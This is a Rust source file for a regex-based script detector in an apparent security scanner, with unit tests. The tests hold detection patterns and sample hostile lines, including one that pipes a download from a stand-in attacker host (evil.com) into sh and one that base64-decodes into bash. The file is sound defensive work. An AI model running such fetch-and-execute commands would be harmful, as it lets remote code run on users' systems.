use std::path::Path;
use anyhow::{Context, Result};
use async_trait::async_trait;
use regex::Regex;
use crate::config::ScriptPattern;
use crate::engine::event::Severity;

#[derive(Debug, Clone)]
pub struct DetectorMatch {
    pub rule_name:    String,
    pub matched_text: String,
    pub severity:     Severity,
}

#[async_trait]
pub trait ContentDetector: Send + Sync {
    fn name(&self) -> &str;
    fn extensions(&self) -> &[String];
    /// Scan file content. Returns empty Vec if nothing matches.
    async fn scan(&self, path: &Path, content: &str) -> Vec<DetectorMatch>;
}

// ─── ScriptDetector ──────────────────────────────────────────────────────────

pub struct CompiledScriptPattern {
    pub name:     String,
    pub re:       Regex,
    pub severity: Severity,
}

pub struct ScriptDetector {
    patterns:   Vec<CompiledScriptPattern>,
    extensions: Vec<String>,
}

impl ScriptDetector {
    pub fn from_config(patterns: &[ScriptPattern], extensions: &[String]) -> Result<Self> {
        let compiled = patterns
            .iter()
            .map(|p| {
                let re = Regex::new(&format!("(?mi){}", p.regex))
                    .with_context(|| format!("invalid script pattern regex {:?}", p.name))?;
                let severity = parse_severity(&p.severity);
                Ok(CompiledScriptPattern { name: p.name.clone(), re, severity })
            })
            .collect::<Result<Vec<_>>>()?;
        Ok(Self { patterns: compiled, extensions: extensions.to_vec() })
    }

    pub fn empty() -> Self {
        Self { patterns: Vec::new(), extensions: Vec::new() }
    }

    pub fn is_empty(&self) -> bool {
        self.patterns.is_empty()
    }
}

#[async_trait]
impl ContentDetector for ScriptDetector {
    fn name(&self) -> &str { "script" }

    fn extensions(&self) -> &[String] { &self.extensions }

    async fn scan(&self, _path: &Path, content: &str) -> Vec<DetectorMatch> {
        let mut matches = Vec::new();
        for pat in &self.patterns {
            if let Some(m) = pat.re.find(content) {
                matches.push(DetectorMatch {
                    rule_name:    pat.name.clone(),
                    matched_text: m.as_str().chars().take(120).collect(), // cap snippet length
                    severity:     pat.severity.clone(),
                });
            }
        }
        matches
    }
}

fn parse_severity(s: &str) -> Severity {
    match s.to_lowercase().as_str() {
        "info"     => Severity::Info,
        "low"      => Severity::Low,
        "medium"   => Severity::Medium,
        "high"     => Severity::High,
        "critical" => Severity::Critical,
        _          => Severity::Medium,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::ScriptPattern;

    fn pat(name: &str, regex: &str, severity: &str) -> ScriptPattern {
        ScriptPattern { name: name.into(), regex: regex.into(), severity: severity.into() }
    }

    #[tokio::test]
    async fn detects_curl_pipe_shell() {
        let detector = ScriptDetector::from_config(
            &[pat("curl_pipe", r"curl\s+.*\|\s*(bash|sh)", "high")],
            &["sh".to_string()],
        ).unwrap();
        let path = Path::new("test.sh");
        let hits = detector.scan(path, "curl https://example.com/install.sh | bash").await;
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].rule_name, "curl_pipe");
        assert_eq!(hits[0].severity, Severity::High);
    }

    #[tokio::test]
    async fn no_false_positives() {
        let detector = ScriptDetector::from_config(
            &[pat("curl_pipe", r"curl\s+.*\|\s*(bash|sh)", "high")],
            &["sh".to_string()],
        ).unwrap();
        let hits = detector.scan(Path::new("test.sh"), "echo 'hello world'").await;
        assert!(hits.is_empty());
    }

    #[tokio::test]
    async fn multiple_rules_fire() {
        let detector = ScriptDetector::from_config(&[
            pat("curl_pipe", r"curl\s+.*\|\s*(bash|sh)", "high"),
            pat("base64_exec", r"base64\s+-d.*\|\s*(bash|sh)", "critical"),
        ], &["sh".to_string()]).unwrap();
        let content = "curl http://evil.com/x | sh\necho dGVzdA== | base64 -d | bash";
        let hits = detector.scan(Path::new("test.sh"), content).await;
        assert_eq!(hits.len(), 2);
    }
}
